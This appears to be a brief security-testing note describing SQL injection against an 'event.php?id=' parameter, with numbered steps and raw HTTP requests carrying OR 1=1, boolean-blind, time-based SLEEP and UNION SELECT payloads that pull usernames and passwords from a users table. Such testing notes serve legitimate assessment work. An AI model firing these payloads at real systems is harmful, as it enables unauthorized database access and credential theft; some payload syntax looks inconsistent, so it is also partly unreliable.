## Use case

The application exposed a critical SQL Injection vulnerability through the '/event.php?id=1' parameter, allowing unauthenticated attackers to retrieve sensitive database information without any authentication.

## Steps to test

1. Send a request to '/event.php?id=1' and observe the response.
2. Modify the parameter to '/event.php?id=1 OR 1=1' to test for SQL Injection.
3. If the application behaves differently, proceed with further tests.
4. Test for Boolean-based Blind SQL Injection by using '/event.php?id=1 AND (SELECT 1 FROM dual WHERE 'a'='a')'.
5. Test for Time-based Blind SQL Injection by using '/event.php?id=1; IF(1=1, SLEEP(5), 0)'.
6. Test for UNION-based SQL Injection by using '/event.php?id=1 UNION SELECT username, password FROM users'.

## Commands

```text
GET /event.php?id=1 HTTP/1.1
GET /event.php?id=1 OR 1=1 HTTP/1.1
GET /event.php?id=1 AND (SELECT 1 FROM dual WHERE 'a'='a') HTTP/1.1
GET /event.php?id=1; IF(1=1, SLEEP(5), 0) HTTP/1.1
GET /event.php?id=1 UNION SELECT username, password FROM users HTTP/1.1
/event.php?id=1
```
